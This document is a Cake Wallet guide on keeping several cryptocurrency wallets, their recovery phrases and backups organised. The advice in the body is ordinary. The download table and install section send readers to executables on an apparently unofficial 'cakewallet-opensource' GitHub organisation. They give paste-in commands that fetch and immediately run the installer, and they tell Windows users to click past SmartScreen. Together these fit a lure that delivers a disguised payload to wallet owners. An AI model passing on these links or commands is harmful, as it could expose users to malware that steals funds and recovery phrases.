![Cake Wallet multiple wallets guide](assets/cake-wallet-multiple-wallets-article-banner.png)

# Manage Multiple Wallets in Cake Wallet

What a second wallet really separates, and how to keep the backups straight.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Add wallets from the wallet list, give each a name that says what it is for, and keep its phrase with it. A second wallet has its own keys and its own backup, so one phrase does not restore all of them. Wallet groups organise the list but do not merge balances or phrases.

<!-- ARTICLE-BODY-BEGIN -->

## Why more than one wallet
Separating funds by purpose is the reason most people add a second wallet: one for savings, one for spending, one for a specific project. A separate wallet also separates its transaction history, which matters if you ever need to hand a record to someone.

Accounts inside a single Monero wallet do some of that work more cheaply, with one phrase and one backup. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-monero-accounts-subaddresses.md">Monero accounts and subaddresses</a> explains where the line sits.

## Adding another wallet later
From the wallet list, add a wallet and choose create or restore. Creating generates a fresh phrase; restoring brings an existing wallet in. Both leave the wallets you already have untouched.

The PIN is shared across the app, while the phrases are not shared across wallets. That asymmetry is what people trip over: locking the app protects every wallet on the device, and losing one phrase loses one wallet.

## One seed, several wallets
Each wallet has its own phrase unless you deliberately restored the same one twice. Keeping a single note that says only "Cake Wallet phrase" is the failure mode: months later, you cannot tell which wallet it restores.

Write the wallet's name on the paper with the words. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md">Back up your Cake Wallet phrase</a> explains how to test one, which is the only way to know the label is right.

## Wallets against accounts
A wallet is a separate balance with a separate phrase; an account is a subdivision inside a Monero wallet. Two accounts share one phrase and one rescan; two wallets share nothing.

Choosing between them is a backup decision as much as an organisational one. More wallets mean more phrases to keep, and more chances to lose one.

## Naming and reorganising
Wallets can be renamed, and the name is local to the device. Renaming does not change keys, addresses or the phrase, so it is safe to do at any time and useful before you write anything down.

Groups are a display convenience. They do not create a shared balance and they do not change what a restore brings back.

## Install a current build
Wallet management is part of the app shell, and older builds offer fewer options. Install the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">latest Cake Wallet release</a> before you build a structure you intend to keep, so a later restore on another machine behaves the same way.

If you are setting up a second device, restore there rather than moving files. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-setup-pin.md">Set up Cake Wallet</a> covers the first-run choices that come before any of this.

## FAQ
### How do I keep many wallets organised?
Name each one by purpose, keep its phrase labelled with that name, and use groups only for display.
### Can I rename a wallet?
Yes. The name is stored on the device and does not affect keys or addresses.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[Monero accounts and subaddresses](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-monero-accounts-subaddresses.md) · [back up your Cake Wallet phrase](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md) · [set up Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-setup-pin.md) · [latest Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
